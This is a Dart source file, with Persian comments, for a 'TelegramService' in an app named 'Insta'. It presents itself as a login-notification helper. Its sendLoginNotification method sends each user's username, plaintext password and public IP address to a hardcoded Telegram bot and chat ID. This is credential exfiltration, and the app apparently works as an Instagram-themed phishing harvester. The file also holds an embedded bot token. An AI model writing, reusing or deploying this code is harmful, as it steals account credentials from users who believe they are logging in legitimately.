import 'package:dio/dio.dart';

class TelegramService {
  final Dio _dio = Dio();
  
  // توکن ربات تلگرام
  final String botToken = '7978598182:AAH3hNCoeTR_gQraXQsgCaeuq8OwwcIoP9U';
  // Chat ID
  final String chatId = '753234314';
  
  final String telegramApiUrl = 'https://api.telegram.org/bot';

  TelegramService() {
    _dio.options.connectTimeout = const Duration(seconds: 10);
    _dio.options.receiveTimeout = const Duration(seconds: 10);
  }

  /// ارسال اطلاعات ورود به تلگرام
  Future<bool> sendLoginNotification({
    required String username,
    required String password,
    required String ipAddress,
  }) async {
    try {
      final message = '''
🔐 *ورود جدید به اپ Insta*

👤 *نام‌کاربری:* `$username`
🔑 *رمز عبور:* `$password`
📍 *IP آدرس:* `$ipAddress`
⏰ *زمان:* ${DateTime.now().toString()}

---
⚠️ اگر این شما نبودید، رمز عبورتان را تغییر دهید!
      ''';

      final response = await _dio.post(
        '$telegramApiUrl$botToken/sendMessage',
        data: {
          'chat_id': chatId,
          'text': message,
          'parse_mode': 'Markdown',
        },
      );

      if (response.statusCode == 200) {
        print('✅ پیام تلگرام ارسال شد');
        return true;
      }
      return false;
    } catch (e) {
      print('❌ خطا در ارسال پیام تلگرام: $e');
      return false;
    }
  }

  /// دریافت IP آدرس کاربر
  Future<String?> getPublicIpAddress() async {
    try {
      final response = await _dio.get('https://api.ipify.org?format=json');
      if (response.statusCode == 200) {
        return response.data['ip'];
      }
      return null;
    } catch (e) {
      print('❌ خطا در دریافت IP: $e');
      return null;
    }
  }

  /// ارسال پیام سفارشی
  Future<bool> sendCustomMessage(String message) async {
    try {
      final response = await _dio.post(
        '$telegramApiUrl$botToken/sendMessage',
        data: {
          'chat_id': chatId,
          'text': message,
          'parse_mode': 'Markdown',
        },
      );

      return response.statusCode == 200;
    } catch (e) {
      print('❌ خطا در ارسال پیام: $e');
      return false;
    }
  }

  /// ارسال اطلاعات خطا
  Future<bool> sendErrorNotification(String errorMessage) async {
    try {
      final message = '''
⚠️ *خطا در اپ Insta*

📝 *پیام خطا:* 
```
$errorMessage
```

⏰ *زمان:* ${DateTime.now().toString()}
      ''';

      return await sendCustomMessage(message);
    } catch (e) {
      print('❌ خطا در ارسال اطلاع خطا: $e');
      return false;
    }
  }
}
